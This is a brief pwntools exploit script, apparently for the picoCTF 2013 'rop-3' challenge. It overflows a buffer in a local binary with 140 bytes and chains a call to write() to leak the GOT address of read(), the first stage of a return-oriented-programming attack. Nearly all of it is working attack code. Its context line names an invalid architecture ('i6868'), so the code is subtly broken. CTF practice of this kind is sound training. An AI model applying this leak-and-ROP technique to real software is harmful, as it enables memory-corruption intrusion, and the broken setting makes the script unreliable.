from pwn import *
context(arch="i6868",os="linux")
#https://github.com/ctfs/write-ups-2013/tree/master/pico-ctf-2013/rop-3
#write(1,address_read_GOT,4)
#adresse write objdump -d rop3-7f3312fe43c46d26
#adresse read objdump -R rop3-7f3312fe43c46d26

# 0x080484d4 <+14>:    call   0x8048474 <vulnerable_function>


leak = "A"*140 + "\xa0\x83\x04\x08" + "\xd4\x84\x04\x08" + "\x01\x00\x00\x00" + "\x00\xa0\x04\x08" + "\x04\x00\x00\x00"
exploit = process("./rop3",shell=True)
exploit.sendline(leak)
read_addr = unpack(exploit.recv(4))
print ("[+] Lecture a: "+hex(read_addr))


exploit.sendline(leak)
read_addr2 = unpack(exploit.recv(4))
print ("[+] Lecture a: "+hex(read_addr2))